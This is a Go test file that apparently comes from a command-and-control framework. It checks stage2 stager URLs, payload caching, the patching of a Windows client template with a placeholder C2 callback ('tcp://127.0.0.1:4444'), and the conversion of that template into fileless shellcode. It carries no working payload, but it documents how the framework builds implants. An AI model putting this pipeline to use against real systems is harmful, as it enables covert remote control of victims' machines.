package services

import (
	"os"
	"path/filepath"
	"testing"
)

func TestResolveStagerStage2URL(t *testing.T) {
	u := ResolveStagerStage2URL("http://10.0.0.1:9999", "abc12def")
	if u != "http://10.0.0.1:9999/api/stage2/abc12def" {
		t.Fatalf("got %s", u)
	}
	u2 := ResolveStagerStage2URL("panel.local:8080", "id1")
	if u2 != "http://panel.local:8080/api/stage2/id1" {
		t.Fatalf("got %s", u2)
	}
}

func TestStage2CacheRoundTrip(t *testing.T) {
	body := []byte{0x90, 0x90, 0xC3, 0x01, 0x02}
	StoreStage2("test-stage2-id", body, "x64", "ln1", "tcp://1.2.3.4:443")
	got, meta, err := LoadStage2("test-stage2-id")
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != len(body) {
		t.Fatalf("len %d != %d", len(got), len(body))
	}
	for i := range body {
		if got[i] != body[i] {
			t.Fatalf("byte mismatch at %d", i)
		}
	}
	if meta.Arch != "x64" || meta.Listener != "ln1" {
		t.Fatalf("meta %+v", meta)
	}
	if _, _, err := LoadStage2("missing-id"); err == nil {
		t.Fatal("expected missing error")
	}
}

func TestBuildFilelessStage2FromTemplateOrSkip(t *testing.T) {
	// Prefer a real client template when present; otherwise skip Donut conversion.
	candidates := []string{
		filepath.Join("assets", "client_template_windows_tcp_minimal.exe"),
		filepath.Join("..", "assets", "client_template_windows_tcp_minimal.exe"),
		filepath.Join("assets", "client_template_windows.exe"),
		filepath.Join("storage", "modules", "shell.bin"),
		filepath.Join("..", "storage", "modules", "shell.bin"),
	}
	var pe []byte
	var used string
	for _, p := range candidates {
		b, err := os.ReadFile(p)
		if err == nil && len(b) > 64 && b[0] == 'M' && b[1] == 'Z' {
			pe = b
			used = p
			break
		}
	}
	if pe == nil {
		t.Skip("no PE template/module available for Donut conversion")
	}

	// Patch with dummy C2 (placeholders may or may not match — still MZ PE)
	patched, err := PatchPayload(pe, "tcp://127.0.0.1:4444", "testkey123456789012345678901234", 30, 20, "", false, 0, "salt", "none")
	if err != nil {
		// Use raw PE if placeholders missing
		t.Logf("PatchPayload: %v — using raw PE from %s", err, used)
		patched = pe
	}
	sc, err := BuildFilelessStage2(patched, "x64")
	if err != nil {
		// Environment may lack Donut-compatible PE layout
		t.Logf("BuildFilelessStage2 failed (recorded): %v", err)
		// Still prove contract rejects garbage
		if _, err2 := BuildFilelessStage2([]byte("not-a-pe"), "x64"); err2 == nil {
			t.Fatal("expected reject non-PE")
		}
		return
	}
	if len(sc) == 0 {
		t.Fatal("empty shellcode")
	}
	t.Logf("fileless stage2 from %s: %d bytes", used, len(sc))
	id := "e2e-fileless-sc"
	StoreStage2(id, sc, "x64", "test", "tcp://127.0.0.1:4444")
	got, _, err := LoadStage2(id)
	if err != nil || len(got) != len(sc) {
		t.Fatalf("cache roundtrip after build: %v len=%d", err, len(got))
	}
}

func TestBuildFilelessStage2RejectsGarbage(t *testing.T) {
	if _, err := BuildFilelessStage2(nil, "x64"); err == nil {
		t.Fatal("expected error")
	}
	if _, err := BuildFilelessStage2([]byte("MZ"), "x64"); err == nil {
		t.Fatal("expected error for tiny buffer")
	}
}

func TestModuleDescribeLoadMode(t *testing.T) {
	_, _, _, mode := ModuleDescribeEx("iso_host")
	if mode != "iso" {
		t.Fatalf("iso_host load_mode=%s", mode)
	}
	_, _, _, mode = ModuleDescribeEx("shell")
	if mode != "mem" {
		t.Fatalf("shell load_mode=%s", mode)
	}
	_, _, _, mode = ModuleDescribeEx("bof")
	if mode != "legacy" {
		t.Fatalf("bof load_mode=%s", mode)
	}
}
